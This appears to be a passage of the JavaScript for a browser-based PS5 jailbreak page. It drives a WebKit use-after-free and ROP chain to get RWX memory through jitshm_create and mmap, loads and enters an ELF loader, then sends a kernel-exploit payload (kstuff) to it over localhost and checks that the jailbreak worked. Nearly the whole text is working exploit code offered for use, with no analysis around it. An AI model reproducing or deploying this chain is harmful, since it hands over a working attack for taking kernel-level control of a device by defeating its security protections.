    log(`elfldr fetched: ${elfData.length} bytes, ${res.headers.get("content-type") || "?"}, `
        + `first bytes ${head.join("")}`, "log-info");
    if (elfData.length < 0x40) throw new Error(`elfldr: short read (${elfData.length} bytes)`);

    const PAGE = 0x4000;
    const PROT_RWX = 0x7, PROT_RW = 0x3;
    const MAP_SHARED = 0x1;
    const SYS_MMAP = 0x1DD;
    const SYS_JITSHM_CREATE = 0x215, SYS_JITSHM_ALIAS = 0x216;

    // ---- 1. parse the ELF --------------------------------------------------
    // elfldr-ps5-1360.elf is ET_DYN (a PIE): the file is NOT a flat image and
    // the entry point lives at base + e_entry. Copying the file 1:1 and
    // jumping to the mapping base -- what this used to do -- lands on the
    // \x7fELF header, not on code.
    const dv = new DataView(elfData.buffer, elfData.byteOffset, elfData.byteLength);
    // The first four bytes are 7F 45 4C 46. A BIG-endian read of those bytes is
    // 0x7F454C46 -- comparing against the byte-reversed 0x464C457F (which is only
    // correct for a little-endian read) rejects every real ELF.
    if (dv.getUint32(0, false) !== 0x7F454C46) {
        const head = [];
        for (let i = 0; i < Math.min(16, elfData.length); i++) {
            head.push(elfData[i].toString(16).padStart(2, "0"));
        }
        throw new Error(`elfldr: not an ELF file (got ${elfData.length} bytes, `
            + `magic ${head.join("")})`);
    }
    if (dv.getUint8(4) !== 2 || dv.getUint8(5) !== 1)
        throw new Error("elfldr: not a little-endian 64-bit ELF");
    const eType = dv.getUint16(16, true);
    const eEntry = dv.getUint32(24, true);
    const ePhoff = dv.getUint32(32, true);
    const ePhentsize = dv.getUint16(54, true);
    const ePhnum = dv.getUint16(56, true);

    const segments = [];
    let span = 0;
    for (let i = 0; i < ePhnum; i++) {
        const o = ePhoff + i * ePhentsize;
        if (o + ePhentsize > elfData.length) break;
        if (dv.getUint32(o, true) !== 1) continue;            // PT_LOAD only
        const off = dv.getUint32(o + 8, true);
        const vaddr = dv.getUint32(o + 16, true);
        const filesz = dv.getUint32(o + 32, true);
        const memsz = dv.getUint32(o + 40, true);
        if (off + filesz > elfData.length)
            throw new Error(`elfldr: PT_LOAD #${i} (off 0x${off.toString(16)}, `
                + `filesz 0x${filesz.toString(16)}) runs past the end of the file`);
        segments.push({ off, vaddr, filesz, memsz });
        if (vaddr + memsz > span) span = vaddr + memsz;
    }
    if (!segments.length) throw new Error("elfldr: no PT_LOAD segments to load");
    const imageSize = (span + PAGE - 1) & ~(PAGE - 1);
    log(`elfldr: ${eType === 3 ? "PIE (ET_DYN)" : "ET_" + eType}, entry +0x${eEntry.toString(16)}, `
        + `${segments.length} PT_LOAD, image 0x${imageSize.toString(16)}`, "log-info");

    // ---- 2. get executable memory ------------------------------------------
    // PS5 does not grant an unprivileged anonymous RWX mapping. Ask
    // jitshm_create(2) for an executable fd and mmap MAP_SHARED over it, which
    // is what the validated slopkit stage-5 loader does. The old code asked for
    // MAP_PRIVATE|MAP_ANONYMOUS with fd = -1, which always returns -1 -- and it
    // then went on to write 397 KB of ELF at 0xffffffffffffffff, which is what
    // ended in "not enough memory space".
    log(`entering first ROP syscall: jitshm_create(0, 0x${imageSize.toString(16)}, PROT_RWX)`, "log-info");
    if (typeof health === "function" && !health("before-jitshm")) {
        throw new Error("heap was already corrupt before the first syscall");
    }
    const jitFd = await chain.syscall_int32(SYS_JITSHM_CREATE, 0, imageSize, PROT_RWX);
    if (!(jitFd >= 0)) throw new Error(`jitshm_create(0x215) failed: fd=${jitFd}`);
    log(`jitshm_create -> fd ${jitFd} (0x${imageSize.toString(16)} bytes, PROT_RWX)`, "log-ok");
    const mapped = await chain.syscall(SYS_MMAP, 0, imageSize, PROT_RWX, MAP_SHARED, jitFd, 0);
    if ((mapped.low >>> 0) === 0xFFFFFFFF && (mapped.hi >>> 0) === 0xFFFFFFFF)
        throw new Error("mmap(PROT_RWX, MAP_SHARED, jitshm fd) returned -1");
    if (mapped.hi > 0xffff)
        throw new Error(`mmap returned a non-canonical address: 0x${mapped.toString()}`);
    log(`elfldr mapped RWX at 0x${mapped.toString()}`, "log-ok");

    // ---- 3. stage the image and copy it in with one memcpy ------------------
    // A per-byte primitive loop would be ~400k carrier round trips; memcpy runs
    // on the hijacked thread and is instant.
    const staging = new Uint8Array(imageSize);
    for (const s of segments) staging.set(elfData.subarray(s.off, s.off + s.filesz), s.vaddr);
    nogc.push(staging);
    const stagingPtr = p.read8(p.leakval(staging).add32(0x10));
    log(`staging ${imageSize} byte image at 0x${stagingPtr.toString()}`, "log-info");

    const expectDword = (off) =>
        (elfData[off] | (elfData[off + 1] << 8) | (elfData[off + 2] << 16)
            | (elfData[off + 3] << 24)) >>> 0;
    function verifyWrite(at) {
        let bad = 0, firstBad = -1;
        for (const s of segments) {
            for (let o = 0; o + 4 <= s.filesz; o += 0x4000) {
                if ((p.read4(at.add32(s.vaddr + o)) >>> 0) !== expectDword(s.off + o)) {
                    if (firstBad < 0) firstBad = s.vaddr + o;
                    bad++;
                }
            }
        }
        return { bad, firstBad };
    }

    chain.fcall(libcMemcpy, mapped, stagingPtr, imageSize);
    await chain.run();

    let v = verifyWrite(mapped);
    if (v.bad !== 0) {
        // The exec mapping refused the write; retry through a RW alias of the
        // same jitshm object, exactly like the slopkit stage-5 loader does.
        log(`write to the exec mapping did not land (${v.bad} bad dwords, first at `
            + `+0x${v.firstBad.toString(16)}); retrying via jitshm_alias`, "log-warn");
        const wFd = await chain.syscall_int32(SYS_JITSHM_ALIAS, jitFd, PROT_RW);
        if (!(wFd >= 0)) throw new Error(`jitshm_alias(0x216) failed: fd=${wFd}`);
        const wAddr = await chain.syscall(SYS_MMAP, 0, imageSize, PROT_RW, MAP_SHARED, wFd, 0);
        if ((wAddr.low >>> 0) === 0xFFFFFFFF && (wAddr.hi >>> 0) === 0xFFFFFFFF)
            throw new Error("mmap of the jitshm alias returned -1");
        chain.fcall(libcMemcpy, wAddr, stagingPtr, imageSize);
        await chain.run();
        v = verifyWrite(wAddr);
        if (v.bad !== 0)
            throw new Error(`elfldr image did not land: ${v.bad} bad dwords, first at `
                + `+0x${v.firstBad.toString(16)} (alias fd ${wFd})`);
        log(`image written through jitshm alias fd ${wFd} @ 0x${wAddr.toString()}`, "log-ok");
    } else {
        log(`image verified in the exec mapping (${segments.length} PT_LOAD segments)`, "log-ok");
    }

    // ---- 4. enter the ELF --------------------------------------------------
    // _start reads argc/argv/envp out of the registers, and those registers
    // still hold chain data, so hand it a real (if minimal) triple.
    const args = new Uint32Array(0x40);
    nogc.push(args);
    const argsPtr = p.read8(p.leakval(args).add32(0x10));
    p.write8(argsPtr, 0);                                  // envp[0] = NULL
    p.write8(argsPtr.add32(0x10), argsPtr.add32(0x20));   // argv[0] -> name
    p.write8(argsPtr.add32(0x18), 0);                      // argv[1] = NULL
    const argv0 = "elfldr";
    for (let i = 0; i < argv0.length; i++) p.write1(argsPtr.add32(0x20 + i), argv0.charCodeAt(i));
    p.write1(argsPtr.add32(0x20 + argv0.length), 0);

    const entryAddr = mapped.add32(eEntry);
    log(`calling elfldr entry 0x${entryAddr.toString()} (base + e_entry)`, "log-info");
    chain.fcall(entryAddr, 1, argsPtr.add32(0x10), argsPtr);
    // elfldr is a server: it never returns, so hand the thread over instead of
    // waiting for a worker reply that can never arrive.
    await chain.p.launch_chain(chain, { noReturn: true });
    log("elfldr entry executed", "log-ok");

    for (let i = 0; i < 60; i++) {
        await sleep(1000);
        try {
            await fetch("http://127.0.0.1:9026/health", { method: "GET", mode: "no-cors" });
            log("elfldr bound on port 9026", "log-ok");
            return true;
        } catch (e) { log(`Waiting for elfldr... ${i+1}/60`, "log-warn"); }
    }
    throw new Error("elfldr did not bind on port 9026");
}

async function loadKstuffViaElfldr() {
    log("Sending kstuff.elf to elfldr (port 9026)...", "log-info");
    const res = await fetch("payloads/kstuff.elf");
    if (!res.ok) throw new Error("Failed to fetch kstuff");
    const data = await res.arrayBuffer();
    await fetch("http://127.0.0.1:9026/load", { method: "POST", mode: "no-cors", body: data });
    log("kstuff sent, waiting for kernel exploit...", "log-info");

    for (let i = 0; i < 90; i++) {
        await sleep(1000);
        if (i % 10 === 0) log(`Kernel exploit running... ${i}s`, "log-info");
    }
}

async function verifyJailbreak() {
    log("Verifying jailbreak on port 9020...", "log-info");
    for (let i = 0; i < 30; i++) {
        await sleep(1000);
        try {
            await fetch("http://127.0.0.1:9020/ping", { method: "GET", mode: "no-cors" });
            log("Jailbreak verified! kstuff active on port 9020", "log-ok");
            return true;
        } catch (e) { log(`Waiting for kstuff... ${i+1}/30`, "log-warn"); }
    }
    throw new Error("kstuff not responding on port 9020");
}

async function runFullExploitChain() {
    if (!exploitModulesLoaded) {
        throw new Error("Exploit modules not loaded");
    }
    
    exploitState.stage = "webkit_uaf";
    updateStageBadge("webkit_uaf");
    cat.className = "run";
    msg.textContent = "Running WebKit UAF exploit...";
    progress.textContent = "";

    try {
        await runWebKitUAF((detail) => { progress.textContent = detail; });
        exploitState.webkitExploited = true;

        // The exploit graphs are released at PAIR-RELEASE but not yet
        // reclaimed; give JSC room before the ROP stage spawns its worker.
        await settleMemoryBeforeROP();

        exploitState.stage = "primitive";
        updateStageBadge("primitive");

        exploitState.stage = "rop_ready";
        updateStageBadge("rop_ready");
        const ropCtx = await initROP();
        exploitState.chain = ropCtx.chain;
        exploitState.p = ropCtx.p;

        exploitState.stage = "elfldr_load";
        updateStageBadge("elfldr_load");
        msg.textContent = "Loading elfldr via ROP...";
        await loadElfldrViaROP(ropCtx);
        exploitState.elfldrLoaded = true;

        exploitState.stage = "kernel_exploit";
        updateStageBadge("kernel_exploit");
        msg.textContent = "Executing kernel exploit (kstuff)...";
        await loadKstuffViaElfldr();
        exploitState.kernelExploited = true;

        exploitState.stage = "verify";
        updateStageBadge("verify");
        msg.textContent = "Verifying jailbreak...";
        await verifyJailbreak();

        exploitState.jailbroken = true;
        exploitState.stage = "complete";
        isJailbroken = true;
        cat.className = "ok";
        jailbreak.textContent = "JAILBROKEN";
        jailbreak.classList.add("disabled");
        jailbreak.classList.remove("running");
        msg.textContent = "JAILBREAK COMPLETE! Payloads unlocked.";
        progress.textContent = "";
        updateStageBadge("complete");
        updatePayloadsUI();
        try { localStorage.setItem("ps5_jailbroken", "1"); } catch (e) {}
        log("=== JAILBREAK COMPLETE ===", "log-ok");

    } catch (err) {
        exploitState.error = err.message;
        exploitState.stage = "failed";
        cat.className = "failed";
        jailbreak.classList.remove("running");
        jailbreak.classList.remove("disabled");
        msg.textContent = `Jailbreak failed: ${err.message}`;
        progress.textContent = "";
        updateStageBadge("failed");
        log(`FAILED: ${err.message}`, "log-err");
        throw err;
    }
}

jailbreak.addEventListener("click", async () => {
    if (isJailbroken) { msg.textContent = "Already jailbroken!"; return; }
    if (!entry) { msg.textContent = "Offsets not loaded yet."; return; }
    
    if (!fw) {
        msg.textContent = "Demo mode: Exploit only runs on PS5 browser.";
        log("Demo mode - exploit requires PS5 browser", "log-warn");
        return;
    }
    
    if (!exploitModulesLoaded) {
        msg.textContent = "Loading exploit modules...";
        log("Waiting for exploit modules to load...", "log-info");
        for (let i = 0; i < 50; i++) {
            await sleep(100);
            if (exploitModulesLoaded) break;
        }
        if (!exploitModulesLoaded) {
            msg.textContent = "Exploit modules failed to load. Check console.";
            log("Exploit modules failed to load", "log-err");
            return;
        }
    }
    
    jailbreak.classList.add("disabled", "running");
    await runFullExploitChain();
});
